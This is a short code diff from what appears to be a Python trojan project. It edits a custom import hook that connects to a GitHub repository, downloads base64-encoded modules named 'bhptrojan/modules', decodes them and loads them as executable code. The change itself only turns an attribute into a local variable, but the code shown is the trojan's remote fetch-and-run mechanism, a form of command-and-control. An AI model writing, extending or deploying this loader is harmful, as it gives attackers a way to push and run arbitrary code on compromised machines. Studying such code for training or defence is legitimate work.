@@ -78,8 +78,8 @@ class GitImporter(MetaPathFinder):
 
     def find_spec(self, fullname, path, target=None):
         print(f"[*] Attempting to retrieve {fullname}")
-        self.repo = github_connect()
-        new_library = get_file_contents("bhptrojan/modules", f"{fullname}.py", self.repo)
+        repo = github_connect()
+        new_library = get_file_contents("bhptrojan/modules", f"{fullname}.py", repo)
         if new_library is not None:
             decoded_module = base64.b64decode(new_library)
             return spec_from_loader(fullname, GitImportLoader(decoded_module))
